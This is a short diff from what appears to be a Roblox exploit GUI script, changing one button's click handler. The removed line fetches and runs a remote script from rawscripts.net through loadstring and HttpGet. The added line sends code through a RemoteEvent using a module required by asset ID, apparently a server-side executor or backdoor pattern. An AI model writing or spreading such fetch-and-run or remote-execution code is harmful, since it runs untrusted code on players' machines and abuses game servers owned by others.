@@ -13048,7 +13048,7 @@ task.spawn(C_G2L_311)
 local function C_G2L_317()
 local script = G2L["317"]
 script.Parent.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Steve-script-24707"))()
+	game.ReplicatedStorage.RemoteEvent:FireServer(require(15581949972).mc("game.Players.LocalPlayer.Name"))
 end)
 end
 task.spawn(C_G2L_317)
